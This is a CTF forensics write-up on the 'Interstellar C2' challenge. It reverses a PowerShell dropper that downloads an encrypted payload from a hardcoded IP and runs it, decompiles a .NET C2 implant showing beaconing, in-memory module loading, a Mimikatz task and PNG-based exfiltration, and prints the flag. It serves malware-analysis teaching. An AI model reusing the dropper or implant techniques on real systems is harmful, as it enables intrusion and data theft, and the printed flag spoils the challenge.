---
layout: post
title: "Cyber Apocalypse 2023: Interstellar C2"
image: '/img/htb-cyber-apocalypse-23/ca-logo-2023.webp'
date:   2023-03-25 00:00:00
tags:
- forensics
- dfir
- malware-analysis
- dnspy
- dll
- dotnet
- wireshark
- c2
- command-and-control
description: 'the end is never the end is never the end is never the end is never the end is never the end is never the end is never the end is never the end is never...'
categories:
published: true
comments: false
---

![logo](https://an00brektn.github.io/img/cyber-apocalypse-23/ca-logo-2023.webp)


## Intro
Interstellar C2 was one of the hard forensics challenges, not because there was anything super obscure or esoteric, but because there were just so, so many layers. We're given a single Wireshark packet capture, where we quickly find a Powershell dropper being used. After reversing the dropper, we uncover the .NET implant, which is easy to reverse. The rest of the challenge entails understanding the code of the implant to ultimately find how it's exfiltrating data, which is by appending a compressed then encrypted file to a PNG. 

* buh
{:toc}

### Description
`We noticed some interesting traffic coming from outer space. An unknown group is using a Command and Control server. After an exhaustive investigation, we discovered they had infected multiple scientists from Pandora's private research lab. Valuable research is at risk. Can you find out how the server works and retrieve what was stolen?`

## Stage 1: Wireshark + Finding the Payload
We start off with a single Wireshark packet capture. Looking at the "Statistics" tab, we see that most of it is HTTP.

![Pasted_image_20230325161144.png](https://an00brektn.github.io/img/cyber-apocalypse-23/Pasted%20image%2020230325161144.png)

Finding what's wrong also is not very hard, the very first request captured is downloading a Powershell dropper.

![Pasted_image_20230325161242.png](https://an00brektn.github.io/img/cyber-apocalypse-23/Pasted%20image%2020230325161242.png)

I can save all of the HTTP requests by doing `File > Export Objects > HTTP` and saving them to a folder called `artifacts/`. Looking at what I get, there's a lot of stuff here.

```shell
kali@transistor:~/ctf/cyber-apocalypse-2023/forensics/interstellar_c2/artifacts$ ls -la
total 7984
drwxr-xr-x 2 kali kali    4096 Mar 25 17:13  .
drwxr-xr-x 3 kali kali    4096 Mar 25 17:13  ..
-rw-r--r-- 1 kali kali  478360 Mar 25 17:13  %3fdVfhJmc2ciKvPOC
-rw-r--r-- 1 kali kali    1516 Mar 25 17:13 '%3fdVfhJmc2ciKvPOC(1)'
-rw-r--r-- 1 kali kali      11 Mar 25 17:13 '%3fdVfhJmc2ciKvPOC(10)'
-rw-r--r-- 1 kali kali      11 Mar 25 17:13 '%3fdVfhJmc2ciKvPOC(11)'
-rw-r--r-- 1 kali kali      42 Mar 25 17:13 '%3fdVfhJmc2ciKvPOC(12)'
-rw-r--r-- 1 kali kali     103 Mar 25 17:13 '%3fdVfhJmc2ciKvPOC(13)'
-rw-r--r-- 1 kali kali 6703168 Mar 25 17:13 '%3fdVfhJmc2ciKvPOC(14)'
-rw-r--r-- 1 kali kali    1516 Mar 25 17:13 '%3fdVfhJmc2ciKvPOC(15)'
-rw-r--r-- 1 kali kali      55 Mar 25 17:13 '%3fdVfhJmc2ciKvPOC(16)'
-rw-r--r-- 1 kali kali    2508 Mar 25 17:13 '%3fdVfhJmc2ciKvPOC(17)'
-rw-r--r-- 1 kali kali      42 Mar 25 17:13 '%3fdVfhJmc2ciKvPOC(18)'
-rw-r--r-- 1 kali kali      55 Mar 25 17:13 '%3fdVfhJmc2ciKvPOC(19)'
-rw-r--r-- 1 kali kali       3 Mar 25 17:13 '%3fdVfhJmc2ciKvPOC(2)'
-rw-r--r-- 1 kali kali      81 Mar 25 17:13 '%3fdVfhJmc2ciKvPOC(20)'
-rw-r--r-- 1 kali kali      55 Mar 25 17:13 '%3fdVfhJmc2ciKvPOC(21)'
-rw-r--r-- 1 kali kali      88 Mar 25 17:13 '%3fdVfhJmc2ciKvPOC(22)'
-rw-r--r-- 1 kali kali  846588 Mar 25 17:13 '%3fdVfhJmc2ciKvPOC(23)'
-rw-r--r-- 1 kali kali      42 Mar 25 17:13 '%3fdVfhJmc2ciKvPOC(24)'
-rw-r--r-- 1 kali kali       3 Mar 25 17:13 '%3fdVfhJmc2ciKvPOC(25)'
-rw-r--r-- 1 kali kali    1516 Mar 25 17:13 '%3fdVfhJmc2ciKvPOC(3)'
-rw-r--r-- 1 kali kali      81 Mar 25 17:13 '%3fdVfhJmc2ciKvPOC(4)'
-rw-r--r-- 1 kali kali    1580 Mar 25 17:13 '%3fdVfhJmc2ciKvPOC(5)'
-rw-r--r-- 1 kali kali      81 Mar 25 17:13 '%3fdVfhJmc2ciKvPOC(6)'
-rw-r--r-- 1 kali kali       3 Mar 25 17:13 '%3fdVfhJmc2ciKvPOC(7)'
-rw-r--r-- 1 kali kali       3 Mar 25 17:13 '%3fdVfhJmc2ciKvPOC(8)'
-rw-r--r-- 1 kali kali     103 Mar 25 17:13 '%3fdVfhJmc2ciKvPOC(9)'
-rw-r--r-- 1 kali kali   18960 Mar 25 17:13  94974f08-5853-41ab-938a-ae1bd86d8e51
-rw-r--r-- 1 kali kali   12632 Mar 25 17:13 'Anni%3fTheda=Merrilee%3fc'
-rw-r--r-- 1 kali kali    2035 Mar 25 17:13  vn84.ps1
```

We can start by reversing the PowerShell dropper. It's really not all too obfuscated- if I just separate things by putting them on new lines, we get the below code.

```powershell
.'Set-iTem' 'vAriAble:qLz0so'  ( [tYpe]'SySTEM.io.FilEmode') ;  
&'set-VariABLE' l60Yu3  ( [tYPe]'sYStem.SeCuRiTY.crypTOgRAphY.aeS');  
.'Set-VARiaBle'  BI34  (  [TyPE]'sySTEm.secURITY.CrYpTogrAPHY.CrypTOSTReAmmoDE');
${URl} = 'http://64.226.84.200/94974f08-5853-41ab-938a-ae1bd86d8e51'
${PTF} = "$env:temp\94974f08-5853-41ab-938a-ae1bd86d8e51"
.'Import-Module' 'BitsTransfer'
.'Start-BitsTransfer' -Source ${uRl} -Destination ${pTf}
${Fs} = &'New-Object' 'IO.FileStream'(${pTf},  ( &'chilDIteM'  'VAriablE:QLz0sO').VALue::"oP`eN")
${MS} = .'New-Object' 'System.IO.MemoryStream';
${aes} =   (GI  VARiaBLe:l60Yu3).VAluE::'Create'.Invoke()
${aEs}.KEYsIZE = 128
${KEY} = [byte[]] (0,1,1,0,0,1,1,0,0,1,1,0,1,1,0,0)
${iv} = [byte[]] (0,1,1,0,0,0,0,1,0,1,1,0,0,1,1,1)
${aES}.KEY = ${KEY}
${Aes}.iV = ${iV}
${cS} = .'New-Object' 'System.Security.Cryptography.CryptoStream'(${mS}, ${aEs}.CreateDecryptor.Invoke(),   (&'GeT-VARIaBLE'  bI34  -VaLue )::"W`RItE");
${fs}.CopyTo.Invoke(${Cs})
${decD} = ${Ms}.ToArray.Invoke()
${CS}.Write.Invoke(${dECD}, 0, ${dECd}.LENgTH);
${DeCd} | .'Set-Content' -Path "$env:temp\tmp7102591.exe" -Encoding 'Byte'
& "$env:temp\tmp7102591.exe"
```

The IP address 64[.]226[.]84[.]2200 is hosting a file with some random numbers and letters, which gets downloaded to the Windows Temp folder. That file is then decrypted with a hardcoded key and IV. Looking at the Microsoft Documentation, we see that it's probably using CBC mode. We could decrypt the payload with this script, but I'll rewrite stuff in Python.

```python
#!/usr/bin/env python3
from Crypto.Cipher import AES

with open('94974f08-5853-41ab-938a-ae1bd86d8e51', 'rb') as fd:
    enc = fd.read()

key = bytes.fromhex('00010100000101000001010001010000')
iv = bytes.fromhex('00010100000000010001010000010101')
cipher = AES.new(key, AES.MODE_CBC, iv=iv)
dec = cipher.decrypt(enc)
with open('./tmp7102591.exe', 'wb') as fd:
    fd.write(dec)
```

If I run my script, we can see that we get a .NET executable back.

```shell
kali@transistor:~/ctf/cyber-apocalypse-2023/forensics/interstellar_c2$ ls -la
total 14984
drwxr-xr-x  3 kali kali    4096 Mar 25 17:20 .
drwxr-xr-x 11 kali kali    4096 Mar 25 17:07 ..
-rw-r--r--  1 kali kali   18960 Mar 25 17:20 94974f08-5853-41ab-938a-ae1bd86d8e51
drwxr-xr-x  2 kali kali    4096 Mar 25 17:13 artifacts
-rw-r--r--  1 kali kali 8725820 Mar  9 15:09 capture.pcapng
-rw-rw-rw-  1 kali kali 6560627 Mar 20 00:34 forensics_interstellar_c2.zip
-rw-r--r--  1 kali kali   18960 Mar 25 17:20 tmp7102591.exe
kali@transistor:~/ctf/cyber-apocalypse-2023/forensics/interstellar_c2$ file tmp7102591.exe
tmp7102591.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows, 3 sections
```

## Stage 2: Reversing the Implant
I'll move this over to my [FLARE-VM](https://github.com/mandiant/flare-vm) which has [dnSpy](https://github.com/dnSpyEx/dnSpy). We covered this in my writeup of [Perfect Match X-treme](https://notateamserver.xyz/sekaictf-writeups/#perfect-match-x-treme) from Sekai CTF, but because the executable is written in .NET, it's much easier to reverse due to reliance on the Common Language Runtime. When we get the decompiled output back, it's very clear that this is some kind of C2 implant or beacon.

![Pasted_image_20230325162636.png](https://an00brektn.github.io/img/cyber-apocalypse-23/Pasted%20image%2020230325162636.png)

I won't go through every function here, but we can follow the execution of the program. The `Main()` function directly calls a new function called `Sharp()`.

```cs
public static void Sharp(long baseAddr = 0L)
{
	Program.DllBaseAddress = new IntPtr(baseAddr);
	if (!string.IsNullOrEmpty("") && !Environment.UserDomainName.ToLower().Contains("".ToLower()))
	{
		return;
	}
	IntPtr consoleWindow = Program.GetConsoleWindow();
	Program.ShowWindow(consoleWindow, 0);
	Program.AUnTrCrts();
	int num = 30;
	int num2 = 60000;
	ManualResetEvent manualResetEvent = new ManualResetEvent(false);
	while (true && num > 0)
	{
		try
		{
			Program.primer();
			break;
		}
		catch
		{
			num--;
			manualResetEvent.WaitOne(num2);
			num2 *= 2;
		}
	}
	IntPtr currentThread = Program.GetCurrentThread();
	Program.TerminateThread(currentThread, 0U);
}
```

This function looks like it's checking if it's safe to execute. If there's a username, and we can reach out to the C2 server, we will continue execution, otherwise we wait and try 30 more times. The `primer()` function comes next, where there's two main parts that we care about. You can see full decompiles of some important functions in the Appendix.

The first part makes a web request to the teamserver.

```cs
string userDomainName = Environment.UserDomainName;
string environmentVariable = Environment.GetEnvironmentVariable("COMPUTERNAME");
string environmentVariable2 = Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE");
int id = Process.GetCurrentProcess().Id;
string processName = Process.GetCurrentProcess().ProcessName;
Environment.CurrentDirectory = Environment.GetEnvironmentVariable("windir");
string text2 = null;
string text3 = null;
foreach (string text4 in Program.basearray)
{
	string text5 = string.Format("{0};{1};{2};{3};{4};{5};1", new object[] { userDomainName, text, environmentVariable, environmentVariable2, id, processName });
	string text6 = "DGCzi057IDmHvgTVE2gm60w8quqfpMD+o8qCBGpYItc=";
	text3 = text4;
	string text7 = text3 + "/Kettie/Emmie/Anni?Theda=Merrilee?c";
	try
	{
		string text8 = Program.GetWebRequest(Program.Encryption(text6, text5, false, null)).DownloadString(text7);
		text2 = Program.Decryption(text6, text8);
		break;
	}
	catch (Exception ex)
	{
		Console.WriteLine(string.Format(" > Exception {0}", ex.Message));
	}
	Program.dfs++;
}
```

The first few lines gather some information, and constructs a string out of them. This is then passed to a `GetWebRequest` function, which will submit it as an encrypted cookie. The request is being made to the `/Kettie/Emmie/Anni?Theda=Merrilee?c` endpoint, whose contents are decrypted and stored in `text2`. From this, the base64 encoded value in `text6` appears to be the encryption key, which we can confirm by looking at the `Encryption()` function.

```cs
private static string Encryption(string key, string un, bool comp = false, byte[] unByte = null)
{
	byte[] array = null;
	if (unByte != null)
	{
		array = unByte;
	}
	else
	{
		array = Encoding.UTF8.GetBytes(un);
	}
	if (comp)
	{
		array = Program.Compress(array);
	}
	string text;
	try
	{
		SymmetricAlgorithm symmetricAlgorithm = Program.CreateCam(key, null, true);
		byte[] array2 = symmetricAlgorithm.CreateEncryptor().TransformFinalBlock(array, 0, array.Length);
		text = Convert.ToBase64String(Program.Combine(symmetricAlgorithm.IV, array2));
	}
	catch
	{
		SymmetricAlgorithm symmetricAlgorithm2 = Program.CreateCam(key, null, false);
		byte[] array3 = symmetricAlgorithm2.CreateEncryptor().TransformFinalBlock(array, 0, array.Length);
		text = Convert.ToBase64String(Program.Combine(symmetricAlgorithm2.IV, array3));
	}
	return text;
}
```

The control flow for this function is as follows:
- `array` stores the plaintext (`unByte`)
	- If `comp` is true, we compress the data
- `CreateCam()` initializes a `SymmetricAlgorithm` object with a random IV in CBC mode.
- `array2` stores the result of the encryption
- We base64 encode the output and return it

If we look at what we got from Wireshark, we can see a huge block of base64 data in the request to that endpoint.

![Pasted_image_20230325164755.png](https://an00brektn.github.io/img/cyber-apocalypse-23/Pasted%20image%2020230325164755.png)

Knowing the key and the IV, we can decrypt.

```python
#!/usr/bin/env python3
from Crypto.Cipher import AES
from base64 import b64encode, b64decode

key = b64decode(b'DGCzi057IDmHvgTVE2gm60w8quqfpMD+o8qCBGpYItc=')

with open('artifacts/Anni%3fTheda=Merrilee%3fc', 'rb') as fd:
    enc = fd.read()
    enc = b64decode(enc)

cipher = AES.new(key, AES.MODE_CBC, iv=key[:16])
dec = cipher.decrypt(enc)

print(dec)
```
```shell
kali@transistor:~/ctf/cyber-apocalypse-2023/forensics/interstellar_c2$ python3 decrypt-stage2.py
b'\xa0\xe2i0\xeeC\xcd|s\x9a\xd6\xf1\xab\xab:\x17ClJBTkRPTVVSSTE5OTAxZFZmaEptYzJjaUt2UE9DMTA5OTFJUlVNT0ROQVIKVVJMUzEwNDg0MzkwMjQzIktldHRpZS9FbW1pZS9Bbm5pP1RoZWRhPU1lcnJpbGVlIiwgIlJleS9PZGVsZS9CZXRzeS9FdmFsZWVuL0x5bm5ldHRlP1Zpb2xldHRhPUFsaW...
```

Well what do you know, more base64. If we look at what the implant does with this output, we see some regex getting involved.

```cs
if (string.IsNullOrEmpty(text2))
{
	throw new Exception();
}
Regex regex = new Regex("RANDOMURI19901(.*)10991IRUMODNAR");
Match match = regex.Match(text2);
string text9 = match.Groups[1].ToString();
regex = new Regex("URLS10484390243(.*)34209348401SLRU");
match = regex.Match(text2);
string text10 = match.Groups[1].ToString();
regex = new Regex("KILLDATE1665(.*)5661ETADLLIK");
match = regex.Match(text2);
string text11 = match.Groups[1].ToString();
regex = new Regex("SLEEP98001(.*)10089PEELS");
match = regex.Match(text2);
string text12 = match.Groups[1].ToString();
regex = new Regex("JITTER2025(.*)5202RETTIJ");
match = regex.Match(text2);
string text13 = match.Groups[1].ToString();
regex = new Regex("NEWKEY8839394(.*)4939388YEKWEN");
match = regex.Match(text2);
string text14 = match.Groups[1].ToString();
regex = new Regex("IMGS19459394(.*)49395491SGMI");
match = regex.Match(text2);
string text15 = match.Groups[1].ToString();
Program.ImplantCore(text3, text9, text10, text11, text12, text14, text15, text13);
```


## Stage 3: `ImplantCore()`
### Reversing Core Functionality
Looking at the `Decryption()` function, we see that it does decode the base64, so we can recreate this in Python to see what's getting passed into `ImplantCore`.

```python
#!/usr/bin/env python3
from Crypto.Cipher import AES
from base64 import b64encode, b64decode
import re

key = b64decode(b'DGCzi057IDmHvgTVE2gm60w8quqfpMD+o8qCBGpYItc=')

with open('artifacts/Anni%3fTheda=Merrilee%3fc', 'rb') as fd:
    enc = fd.read()
    enc = b64decode(enc)

cipher = AES.new(key, AES.MODE_CBC, iv=key[:16])
dec = b64decode(cipher.decrypt(enc)[16:-16]).decode()

patterns = [
    r'RANDOMURI19901(.*)10991IRUMODNAR',
    r'URLS10484390243(.*)34209348401SLRU',
    r'KILLDATE1665(.*)5661ETADLLIK',
    r'SLEEP98001(.*)10089PEELS',
    r'JITTER2025(.*)5202RETTIJ',
    r'NEWKEY8839394(.*)4939388YEKWEN',
    r'IMGS19459394(.*)49395491SGMI'
]
text9_15 = []
for p in patterns:
    matches = re.findall(p, dec)
    text9_15.append(matches[0])

print(text9_15)
```

```shell
kali@transistor:~/ctf/cyber-apocalypse-2023/forensics/interstellar_c2$ python3 decrypt-stage2.py
['dVfhJmc2ciKvPOC', '"Kettie/Emmie/Anni?Theda=Merrilee", ... "Sallie/Lindie/Denni/", "Jeannine/Lucretia/Denna/Prudy/Hendrika/Ilysa/Caroljean?Aline=Tine"', '2025-01-01', '3s', '0.2', 'nUbFDDJadpsuGML4Jxsq58nILvjoNu76u4FIHVGIKSQ=', '"iVBORw0KGgo...trim...6zfsC5Em3hFDfYAAAAASUVORK5CYII="']
```

So we see we get a number of variables, but I'm not really sure what any of them do. Looking at the `ImplantCore()` code, we get a better idea of what's happening.

```cs
private static void ImplantCore(string baseURL, string RandomURI, string stringURLS, string KillDate, string Sleep, string Key, string stringIMGS, string Jitter)
	{
		Program.UrlGen.Init(stringURLS, RandomURI, baseURL);
		Program.ImgGen.Init(stringIMGS);
		Program.pKey = Key;
		int num = 5;
		Regex regex = new Regex("(?<t>[0-9]{1,9})(?<u>[h,m,s]{0,1})", RegexOptions.IgnoreCase | RegexOptions.Compiled);
		Match match = regex.Match(Sleep);
		// trim...
```

Here's what we know:
- `baseURL`, `RandomURI`, and `stringURLs` all define the behavior of the implant as it communicates over HTTP
- There's also some kind of interaction with images happening with `stringIMGS` and `ImgGen`
- `Key` is a new AES key
- `Jitter` and `Sleep` define how long the implant spends asleep in between commands
- `KillDate` defines when the program should finally stop executing

This `ImplantCore()` function defines the main loop of the implant.
```cs
while (!manualResetEvent.WaitOne(new Random().Next((int)((double)(num * 1000) * (1.0 - num2)), (int)((double)(num * 1000) * (1.0 + num2)))))
		{
			if (DateTime.ParseExact(KillDate, "yyyy-MM-dd", CultureInfo.InvariantCulture) < DateTime.Now)
			{
				Program.Run = false;
				manualResetEvent.Set();
			}
			else
			{
				stringBuilder.Length = 0;
				try
				{
					string text = "";
					string cmd = null;
					try
					{
						cmd = Program.GetWebRequest(null).DownloadString(Program.UrlGen.GenerateUrl());
						text = Program.Decryption(Key, cmd).Replace("\0", string.Empty);
					}
// trim...
```

The first part of this loop does a bunch of error handling, but most notably makes a request to a random URL, and then decrypts the output.

```cs
if (text.ToLower().StartsWith("multicmd"))
{
	string text2 = text.Replace("multicmd", "");
	string[] array = text2.Split(new string[] { "!d-3dion@LD!-d" }, StringSplitOptions.RemoveEmptyEntries);
	foreach (string text3 in array)
	{
		Program.taskId = text3.Substring(0, 5);
		cmd = text3.Substring(5, text3.Length - 5);
		if (cmd.ToLower().StartsWith("exit"))
		{
			Program.Run = false;
			manualResetEvent.Set();
			break;
		}
		if (cmd.ToLower().StartsWith("loadmodule"))
		{
			string text4 = Regex.Replace(cmd, "loadmodule", "", RegexOptions.IgnoreCase);
			Assembly assembly = Assembly.Load(Convert.FromBase64String(text4));
			Program.Exec(stringBuilder.ToString(), Program.taskId, Key, null);
		}
// trim...
```

If the output from the decrypted string starts with `multicmd`, it gets processed as a command that the implant will handle. As someone who has [written their own implant before](https://github.com/An00bRektn/gopher47), this is pretty standard, the level of obfuscation is just the tricky part.

Looking at the HTTP requests we dumped out, because of how long the URI's were, they were all named `%3fdVfhJmc2ciKvPOC`. Of those files, the first one and the 14th file seem to have big base64 blobs that are genuinely worth investigating. I'll write a function to parse the blob since we have 2, and who knows if we have more. We have the implant source code, so if we just do exactly what the implant does, we should be good.

```python
new_key = b64decode(text9_15[5])
core_cipher = AES.new(new_key, AES.MODE_CBC, iv=new_key[:16])

def parse_blob(path: str):
    with open(path, 'rb') as fd:
        enc = b64decode(fd.read())

    dec = core_cipher.decrypt(enc)
    dec_b64 = b64decode(dec[16:-8]).decode()

    if dec_b64.startswith('multicmd'):
        arr = dec_b64.replace('multicmd', '').split("!d-3dion@LD!-d")
        i = 0
        for text3 in arr:
            taskid = text3[:5]
            cmd = text3[5:-5]
            print(f"{taskid}: {cmd[:40]}")

parse_blob('./artifacts/%3fdVfhJmc2ciKvPOC')
parse_blob('./artifacts/%3fdVfhJmc2ciKvPOC(14)')
```
```shell
kali@transistor:~/ctf/cyber-apocalypse-2023/forensics/interstellar_c2$ python3 decrypt-stage2.py
00031: loadmoduleTVqQAAMAAAAEAAAA//8AALgAAAAAAA
00032: loadmoduleTVqQAAMAAAAEAAAA//8AALgAAAAAAA
00033: loadpowers
00034: loadmoduleTVqQAAMAAAAEAAAA//8AALgAAAAAAA
00035: run-dll SharpSploit.Credentials.Mimikatz
```

Nice! Let's look at the implant and see what calling these tasks does. `loadmodule` seems to load a .NET assembly into memory.

```cs
if (cmd.ToLower().StartsWith("loadmodule"))
{
	string text4 = Regex.Replace(cmd, "loadmodule", "", RegexOptions.IgnoreCase);
	Assembly assembly = Assembly.Load(Convert.FromBase64String(text4));
	Program.Exec(stringBuilder.ToString(), Program.taskId, Key, null);
}
```

`loadpowers` seems to not exist in the binary, so we'll circle back to that one, but `run-dll` seems to do exactly what you think it does, which is run the DLL.

```cs
//...trim
else if (c.ToLower().StartsWith("run-dll"))
{
	try
	{
		object obj2 = type.Assembly.GetType(text4).InvokeMember(text2, BindingFlags.Static | BindingFlags.Public | BindingFlags.InvokeMethod, null, null, array4);
		if (obj2 != null)
		{
			text = obj2.ToString();
		}
	}
//trim...
```

### Investigating the Assemblies
Let's dump out the assemblies and see what's up.

```python
def parse_blob(path: str, name:str="mal"):
    with open(path, 'rb') as fd:
        enc = b64decode(fd.read())

    dec = core_cipher.decrypt(enc)
    dec_b64 = b64decode(dec[16:-8]).decode()

    if dec_b64.startswith('multicmd'):
        arr = dec_b64.replace('multicmd', '').split("!d-3dion@LD!-d")
        i = 0
        for text3 in arr:
            taskid = text3[:5]
            cmd = text3[5:-5]
            print(f"{taskid}: {cmd[:40]}")

            if cmd.startswith('loadmodule'):
                # apparently the padding is a little bit broken
                cmd = cmd.replace('loadmodule', '')
                eq = (4-(len(cmd)%4))
                assembly = b64decode((cmd+('='*eq)).encode())
                
                with open(f"{name}-{i}.dll", 'wb') as fd:
                    fd.write(assembly)
                    print(f"[+] Wrote: {name}-{i}.dll")
                i += 1

parse_blob('./artifacts/%3fdVfhJmc2ciKvPOC', "mal1")
parse_blob('./artifacts/%3fdVfhJmc2ciKvPOC(14)', "mal2")
```
```shell
kali@transistor:~/ctf/cyber-apocalypse-2023/forensics/interstellar_c2$ python3 decrypt-stage2.py
00031: loadmoduleTVqQAAMAAAAEAAAA//8AALgAAAAAAA
[+] Wrote: mal1-0.dll
00032: loadmoduleTVqQAAMAAAAEAAAA//8AALgAAAAAAA
[+] Wrote: mal1-1.dll
00033: loadpowers
00034: loadmoduleTVqQAAMAAAAEAAAA//8AALgAAAAAAA
[+] Wrote: mal2-0.dll
00035: run-dll SharpSploit.Credentials.Mimikatz
```

If we check what file is what, we confirm we see .NET files.
```shell
kali@transistor:~/ctf/cyber-apocalypse-2023/forensics/interstellar_c2$ file *.dll
mal1-0.dll: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows, 3 sections
mal1-1.dll: PE32 executable (DLL) (console) Intel 80386 Mono/.Net assembly, for MS Windows, 3 sections
mal2-0.dll: PE32 executable (DLL) (console) Intel 80386 Mono/.Net assembly, for MS Windows, 3 sections
```

If we stick this into dnSpy, the metadata immediately tells us what is what:
- `mal1-0.dll` is actually an `exe` file called Core. Simply scrolling through the source code tells us that this is a [PoshC2](https://github.com/nettitude/PoshC2) implant
- `mal1-1.dll` is a DLL called `PwrStatusTracker` which handles how Windows turns on and off? I'm not entirely sure.
- `mal2-0.dll` is just a copy of [SharpSploit](https://github.com/cobbr/SharpSploit), with Mimikatz in it

I definitely spent a while trying to reverse each of these .NET files, but ultimately, it doesn't really get us any closer to the flag. What we really need to do is figure out what data is being exfiltrated. 

## Stage 4: Exfiltration
### Analyzing Exfiltration Function
If we look at the `Program.Exec()` function, it doesn't actually execute anything, rather, it exfiltrates output data.
```cs
public static void Exec(string cmd, string taskId, string key = null, byte[] encByte = null)
{
	if (string.IsNullOrEmpty(key))
	{
		key = Program.pKey;
	}
	string text = Program.Encryption(key, taskId, false, null);
	string text2;
	if (encByte != null)
	{
		text2 = Program.Encryption(key, null, true, encByte);
	}
	else
	{
		text2 = Program.Encryption(key, cmd, true, null);
	}
	byte[] array = Convert.FromBase64String(text2);
	byte[] imgData = Program.ImgGen.GetImgData(array);
	int i = 0;
	while (i < 5)
	{
		i++;
		try
		{
			Program.GetWebRequest(text).UploadData(Program.UrlGen.GenerateUrl(), imgData);
			i = 5;
		}
		catch
		{
		}
	}
}
```

We encrypt the output and store this into `array`. However, this `array` variable is then passed into `Program.ImgGen.GetImgData()`.  If we look at the source code for this function, things start to come together.

```cs
internal static byte[] GetImgData(byte[] cmdoutput)
{
	int num = 1500;
	int num2 = cmdoutput.Length + num;
	string text = Program.ImgGen._newImgs[new Random().Next(0, Program.ImgGen._newImgs.Count)];
	byte[] array = Convert.FromBase64String(text);
	byte[] bytes = Encoding.UTF8.GetBytes(Program.ImgGen.RandomString(num - array.Length));
	byte[] array2 = new byte[num2];
	Array.Copy(array, 0, array2, 0, array.Length);
	Array.Copy(bytes, 0, array2, array.Length, bytes.Length);
	Array.Copy(cmdoutput, 0, array2, array.Length + bytes.Length, cmdoutput.Length);
	return array2;
}
```

We take a random image stored in the implant, and then pad it out to 1500 bytes with some garbage data (`Encoding.UTF8.GetBytes(Program.ImgGen.RandomString())`). The encrypted output is then appended to the PNG as is. The `while` loop in the `Exec` function will then upload this image to the teamserver, with 5 attempts. One thing that's important to note is that the call to `Exec` will call the encryption function with compression, so we'll need to do both to recover the data.

### Recovering The Data
Looking though the artifacts we dumped from Wireshark, we can identify which ones are images.
```shell
kali@transistor:~/ctf/cyber-apocalypse-2023/forensics/interstellar_c2/artifacts$ file *
%3fdVfhJmc2ciKvPOC:                   ASCII text, with very long lines (65536), with no line terminators
%3fdVfhJmc2ciKvPOC(1):                PNG image data, 32 x 32, 8-bit colormap, non-interlaced
%3fdVfhJmc2ciKvPOC(10):               ASCII text
%3fdVfhJmc2ciKvPOC(11):               ASCII text
%3fdVfhJmc2ciKvPOC(12):               HTML document, ASCII text
%3fdVfhJmc2ciKvPOC(13):               XML 1.0 document, ASCII text
%3fdVfhJmc2ciKvPOC(14):               ASCII text, with very long lines (65536), with no line terminators
%3fdVfhJmc2ciKvPOC(15):               PNG image data, 30 x 30, 8-bit colormap, non-interlaced
%3fdVfhJmc2ciKvPOC(16):               HTML document, ASCII text
%3fdVfhJmc2ciKvPOC(17):               PNG image data, 32 x 32, 8-bit colormap, non-interlaced
%3fdVfhJmc2ciKvPOC(18):               HTML document, ASCII text
%3fdVfhJmc2ciKvPOC(19):               HTML document, ASCII text
%3fdVfhJmc2ciKvPOC(2):                ASCII text
%3fdVfhJmc2ciKvPOC(20):               HTML document, ASCII text
%3fdVfhJmc2ciKvPOC(21):               HTML document, ASCII text
%3fdVfhJmc2ciKvPOC(22):               ASCII text, with no line terminators
%3fdVfhJmc2ciKvPOC(23):               PNG image data, 32 x 32, 8-bit colormap, non-interlaced
%3fdVfhJmc2ciKvPOC(24):               HTML document, ASCII text
%3fdVfhJmc2ciKvPOC(25):               ASCII text
%3fdVfhJmc2ciKvPOC(3):                PNG image data, 30 x 30, 8-bit colormap, non-interlaced
%3fdVfhJmc2ciKvPOC(4):                HTML document, ASCII text
%3fdVfhJmc2ciKvPOC(5):                PNG image data, 30 x 30, 8-bit colormap, non-interlaced
%3fdVfhJmc2ciKvPOC(6):                HTML document, ASCII text
%3fdVfhJmc2ciKvPOC(7):                ASCII text
%3fdVfhJmc2ciKvPOC(8):                ASCII text
%3fdVfhJmc2ciKvPOC(9):                XML 1.0 document, ASCII text
94974f08-5853-41ab-938a-ae1bd86d8e51: data
Anni%3fTheda=Merrilee%3fc:            ASCII text, with very long lines (12632), with no line terminators
vn84.ps1:                             ASCII text, with very long lines (590), with CRLF line terminators
```

We can then add some code to our decryption script to open the file, take the bytes after byte 1500, and then decrypt and decompress.

```python
pngs = ['%3fdVfhJmc2ciKvPOC(1)',
'%3fdVfhJmc2ciKvPOC(15)',
'%3fdVfhJmc2ciKvPOC(17)',
'%3fdVfhJmc2ciKvPOC(23)',
'%3fdVfhJmc2ciKvPOC(3)',
'%3fdVfhJmc2ciKvPOC(5)',]

decrypted = []
for png in pngs:
    with open(f"artifacts/{png}", 'rb') as fd:
        comp = fd.read()[1500:]
    decrypted.append(core_cipher.decrypt(comp))

import gzip

for i,v in enumerate(decrypted):
    # remove first 16 bytes - IV
    x = gzip.decompress(v[16:])
    with open(f'outputs/output-{i}.bin', 'wb') as fd:
        fd.write(x)
        print(f"[+] Written to outputs/output-{i}.bin")
```
```shell
kali@transistor:~/ctf/cyber-apocalypse-2023/forensics/interstellar_c2$ python3 decrypt-stage2.py
[+] Written to outputs/output-0.bin
[+] Written to outputs/output-1.bin
[+] Written to outputs/output-2.bin
[+] Written to outputs/output-3.bin
[+] Written to outputs/output-4.bin
[+] Written to outputs/output-5.bin
kali@transistor:~/ctf/cyber-apocalypse-2023/forensics/interstellar_c2$ cd outputs/
kali@transistor:~/ctf/cyber-apocalypse-2023/forensics/interstellar_c2/outputs$ file *
output-0.bin: empty
output-1.bin: empty
output-2.bin: ASCII text, with CRLF, LF line terminators
output-3.bin: ASCII text, with very long lines (65536), with no line terminators
output-4.bin: empty
output-5.bin: ASCII text, with no line terminators
```

If we look at `output-3.bin`, we see more base64 encoded data, so we can decode and see if anything changes.
```shell
kali@transistor:~/ctf/cyber-apocalypse-2023/forensics/interstellar_c2/outputs$ cat output-3.bin | base64 -d > output3-decoded.bin
kali@transistor:~/ctf/cyber-apocalypse-2023/forensics/interstellar_c2/outputs$ file output3-decoded.bin
output3-decoded.bin: PNG image data, 1914 x 924, 8-bit/color RGBA, non-interlaced
```

I guess they put a PNG inside a PNG. If we open it, we *finally* find the flag.
![Pasted_image_20230325181714.png](https://an00brektn.github.io/img/cyber-apocalypse-23/Pasted%20image%2020230325181714.png)

**Flag**: `HTB{h0w_c4N_y0U_s3e_p05H_c0mM4nd?}`

There's definitely more investigating to be done, such as finding the Mimikatz output, but I encourage you to go try the challenge on HackTheBox when they put it on the main site.

## Appendix
Not putting all of the functions here, but mostly just the long ones that I didn't want to flood the main writeup with.
